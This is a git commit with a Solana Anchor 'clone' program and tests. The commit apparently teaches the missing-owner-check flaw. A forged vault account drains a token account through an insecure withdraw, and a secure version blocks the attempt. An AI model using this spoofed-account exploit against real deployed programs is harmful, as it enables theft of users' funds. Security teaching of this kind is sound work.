1bdf5de02d85f6e10222cfe613bcacb248884dfe
john <johnzhengyuliu@gmail.com>
2022-11-16 07:56:51 -0600

    draft

---
+++ programs/clone/src/lib.rs
@@ -0,0 +1,35 @@
+use anchor_lang::prelude::*;
+use anchor_spl::token::{self, Mint, Token, TokenAccount};
+
+declare_id!("DUN7nniuatsMC7ReCh5eJRQExnutppN1tAfjfXFmGDq3");
+
+#[program]
+pub mod clone {
+    use super::*;
+
+    pub fn initialize_vault(ctx: Context<InitializeVault>) -> Result<()> {
+        ctx.accounts.vault.token_account = ctx.accounts.token_account.key();
+        ctx.accounts.vault.authority = ctx.accounts.authority.key();
+        Ok(())
+    }
+}
+
+#[derive(Accounts)]
+pub struct InitializeVault<'info> {
+    #[account(
+        init,
+        payer = authority,
+        space = 8 + 32 + 32,
+    )]
+    pub vault: Account<'info, Vault>,
+    pub token_account: Account<'info, TokenAccount>,
+    #[account(mut)]
+    pub authority: Signer<'info>,
+    pub system_program: Program<'info, System>,
+}
+
+#[account]
+pub struct Vault {
+    token_account: Pubkey,
+    authority: Pubkey,
+}
---
+++ tests/owner-check.ts
@@ -0,0 +1,147 @@
+import * as anchor from "@project-serum/anchor"
+import * as spl from "@solana/spl-token"
+import { Program } from "@project-serum/anchor"
+import { OwnerCheck } from "../target/types/owner_check"
+import { Clone } from "../target/types/clone"
+import { findProgramAddressSync } from "@project-serum/anchor/dist/cjs/utils/pubkey"
+import { expect } from "chai"
+
+describe("owner-check", () => {
+  // Configure the client to use the local cluster.
+  anchor.setProvider(anchor.AnchorProvider.env())
+
+  const provider = anchor.AnchorProvider.env()
+  anchor.setProvider(provider)
+
+  const connection = anchor.getProvider().connection
+  const wallet = anchor.workspace.OwnerCheck.provider.wallet
+  const walletFake = anchor.web3.Keypair.generate()
+
+  const program = anchor.workspace.OwnerCheck as Program<OwnerCheck>
+  const programClone = anchor.workspace.Clone as Program<Clone>
+
+  const vault = anchor.web3.Keypair.generate()
+  const vaultClone = anchor.web3.Keypair.generate()
+
+  const [tokenPDA] = findProgramAddressSync(
+    [Buffer.from("token")],
+    program.programId
+  )
+
+  let mint: anchor.web3.PublicKey
+  let withdrawDestinationFake: anchor.web3.PublicKey
+
+  before(async () => {
+    mint = await spl.createMint(
+      connection,
+      wallet.payer,
+      wallet.publicKey,
+      null,
+      0
+    )
+
+    withdrawDestinationFake = await spl.createAccount(
+      connection,
+      wallet.payer,
+      mint,
+      wallet.publicKey
+    )
+
+    await connection.confirmTransaction(
+      await connection.requestAirdrop(
+        walletFake.publicKey,
+        1 * anchor.web3.LAMPORTS_PER_SOL
+      ),
+      "confirmed"
+    )
+  })
+
+  it("Initialize Vault", async () => {
+    await program.methods
+      .initializeVault()
+      .accounts({
+        vault: vault.publicKey,
+        tokenAccount: tokenPDA,
+        mint: mint,
+        authority: provider.wallet.publicKey,
+      })
+      .signers([vault])
+      .rpc()
+
+    await spl.mintTo(
+      connection,
+      wallet.payer,
+      mint,
+      tokenPDA,
+      wallet.payer,
+      100
+    )
+
+    const balance = await connection.getTokenAccountBalance(tokenPDA)
+    expect(balance.value.uiAmount).to.eq(100)
+  })
+
+  it("Initialize Vault", async () => {
+    const tx = await programClone.methods
+      .initializeVault()
+      .accounts({
+        vault: vaultClone.publicKey,
+        tokenAccount: tokenPDA,
+        authority: walletFake.publicKey,
+      })
+      .transaction()
+
+    await anchor.web3.sendAndConfirmTransaction(connection, tx, [
+      walletFake,
+      vaultClone,
+    ])
+  })
+
+  it("Insecure withdraw", async () => {
+    const tx = await program.methods
+      .insecureWithdraw()
+      .accounts({
+        vault: vaultClone.publicKey,
+        tokenAccount: tokenPDA,
+        withdrawDestination: withdrawDestinationFake,
+        authority: walletFake.publicKey,
+      })
+      .transaction()
+
+    await anchor.web3.sendAndConfirmTransaction(connection, tx, [walletFake])
+
+    const balance = await connection.getTokenAccountBalance(tokenPDA)
+    expect(balance.value.uiAmount).to.eq(0)
+  })
+
+  it("Secure withdraw", async () => {
+    try {
+      const tx = await program.methods
+        .secureWithdraw()
+        .accounts({
+          vault: vaultClone.publicKey,
+          tokenAccount: tokenPDA,
+          withdrawDestination: withdrawDestinationFake,
+          authority: walletFake.publicKey,
+        })
+        .transaction()
+
+      await anchor.web3.sendAndConfirmTransaction(connection, tx, [walletFake])
+    } catch (err) {
+      expect(err)
+      console.log(err)
+    }
+  })
+
+  it("Secure withdraw", async () => {
+    const tx = await program.methods
+      .secureWithdraw()
+      .accounts({
+        vault: vault.publicKey,
+        tokenAccount: tokenPDA,
+        withdrawDestination: withdrawDestinationFake,
+        authority: wallet.publicKey,
+      })
+      .rpc()
+  })
+})
